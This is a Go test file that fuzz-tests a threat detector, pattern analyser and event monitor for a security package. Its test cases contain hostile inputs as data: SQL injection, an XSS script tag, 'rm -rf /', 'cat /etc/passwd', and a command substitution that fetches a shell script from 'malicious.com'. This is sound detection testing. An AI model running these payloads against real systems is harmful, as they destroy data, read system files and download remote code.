package tests

import (
	"context"
	"testing"
	"time"

	"diamante/security"
)

// TestSecurityFuzzing performs fuzz testing on security components
func TestSecurityFuzzing(t *testing.T) {
	// Test threat detector with fuzzing data
	detector := security.NewThreatDetector()
	ctx := context.Background()

	// Fuzz test cases
	fuzzCases := []struct {
		name string
		data []byte
	}{
		{
			name: "SQL Injection Pattern",
			data: []byte("'; DROP TABLE users; --"),
		},
		{
			name: "XSS Pattern",
			data: []byte("<script>alert('XSS')</script>"),
		},
		{
			name: "Command Injection Pattern",
			data: []byte("; rm -rf /"),
		},
		{
			name: "High Entropy Data",
			data: generateHighEntropyData(1000),
		},
		{
			name: "Repetitive Pattern",
			data: []byte(repeatString("A", 10000)),
		},
		{
			name: "Binary Data",
			data: []byte{0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00},
		},
		{
			name: "Mixed Malicious Patterns",
			data: []byte("admin' OR '1'='1'; <script>alert(1)</script>; cat /etc/passwd"),
		},
	}

	for _, tc := range fuzzCases {
		t.Run(tc.name, func(t *testing.T) {
			threats, err := detector.DetectThreats(ctx, tc.data)
			if err != nil {
				t.Errorf("threat detection failed: %v", err)
				return
			}

			// Verify threats were detected for malicious patterns
			if len(threats) == 0 && isMaliciousPattern(tc.name) {
				t.Errorf("expected threats for %s but none detected", tc.name)
			}

			// Verify threat properties
			for _, threat := range threats {
				if threat.ID == "" {
					t.Error("threat ID should not be empty")
				}
				if threat.Type == "" {
					t.Error("threat type should not be empty")
				}
				if threat.Severity == "" {
					t.Error("threat severity should not be empty")
				}
				if len(threat.Mitigations) == 0 {
					t.Error("threat should have mitigations")
				}
			}
		})
	}
}

// TestPatternAnalysisFuzzing tests pattern analysis with fuzzing
func TestPatternAnalysisFuzzing(t *testing.T) {
	detector := security.NewThreatDetector()

	patterns := []security.Pattern{
		{
			ID:        "pattern-1",
			Name:      "High Frequency Pattern",
			Type:      "network",
			Data:      []byte("GET /admin/config.php"),
			Frequency: 1000,
			LastSeen:  time.Now(),
		},
		{
			ID:        "pattern-2",
			Name:      "SQL Injection Attempt",
			Type:      "input",
			Data:      []byte("SELECT * FROM users WHERE id='1' OR '1'='1'"),
			Frequency: 50,
			LastSeen:  time.Now(),
		},
		{
			ID:        "pattern-3",
			Name:      "Command Execution",
			Type:      "command",
			Data:      []byte("$(wget http://malicious.com/shell.sh)"),
			Frequency: 10,
			LastSeen:  time.Now(),
		},
	}

	for _, pattern := range patterns {
		t.Run(pattern.Name, func(t *testing.T) {
			analysis, err := detector.AnalyzePattern(pattern)
			if err != nil {
				t.Errorf("pattern analysis failed: %v", err)
				return
			}

			// Verify analysis properties
			if analysis.ID == "" {
				t.Error("analysis ID should not be empty")
			}
			if analysis.PatternID != pattern.ID {
				t.Errorf("expected pattern ID %s, got %s", pattern.ID, analysis.PatternID)
			}
			if analysis.Confidence < 0 || analysis.Confidence > 1 {
				t.Errorf("confidence should be between 0 and 1, got %f", analysis.Confidence)
			}

			// High frequency patterns should raise concerns
			if pattern.Frequency > 100 && len(analysis.Anomalies) == 0 {
				t.Error("high frequency pattern should have anomalies")
			}
		})
	}
}

// TestSecurityEventMonitoringFuzz tests event monitoring with fuzzing
func TestSecurityEventMonitoringFuzz(t *testing.T) {
	monitor := security.NewSecurityMonitor()
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	eventChan, err := monitor.MonitorEvents(ctx)
	if err != nil {
		t.Fatalf("failed to start monitoring: %v", err)
	}

	// Generate fuzz events
	eventTypes := []security.SecurityEventType{
		security.EventTypeAccessDenied,
		security.EventTypeAuthFailure,
		security.EventTypeThreatDetected,
		security.EventTypeVulnerabilityFound,
		security.EventTypePolicyViolation,
		security.EventTypeAnomalyDetected,
	}

	severities := []security.SeverityLevel{
		security.SeverityCritical,
		security.SeverityHigh,
		security.SeverityMedium,
		security.SeverityLow,
		security.SeverityInfo,
	}

	// Send fuzz events
	for i := 0; i < 100; i++ {
		event := security.SecurityEvent{
			Type:        eventTypes[i%len(eventTypes)],
			Severity:    severities[i%len(severities)],
			Source:      "fuzz-test",
			Target:      "test-target",
			Description: generateRandomString(50),
			Timestamp:   time.Now(),
			Details:     map[string]interface{}{"fuzz_id": i},
		}

		err := monitor.RecordEvent(event)
		if err != nil {
			t.Errorf("failed to record event %d: %v", i, err)
		}
	}

	// Verify events are received
	receivedCount := 0
	timeout := time.After(2 * time.Second)

	for {
		select {
		case event := <-eventChan:
			receivedCount++
			if event.Source != "fuzz-test" {
				t.Error("received event from unexpected source")
			}
		case <-timeout:
			if receivedCount < 50 {
				t.Errorf("expected to receive at least 50 events, got %d", receivedCount)
			}
			return
		}
	}
}

// Helper functions

func generateHighEntropyData(size int) []byte {
	data := make([]byte, size)
	for i := 0; i < size; i++ {
		data[i] = byte(i % 256)
	}
	return data
}

func repeatString(s string, count int) string {
	result := ""
	for i := 0; i < count; i++ {
		result += s
	}
	return result
}

func isMaliciousPattern(name string) bool {
	malicious := []string{"SQL Injection", "XSS", "Command Injection", "Mixed Malicious"}
	for _, m := range malicious {
		if name == m+" Pattern" {
			return true
		}
	}
	return false
}

func generateRandomString(length int) string {
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	result := make([]byte, length)
	for i := 0; i < length; i++ {
		result[i] = chars[i%len(chars)]
	}
	return string(result)
}
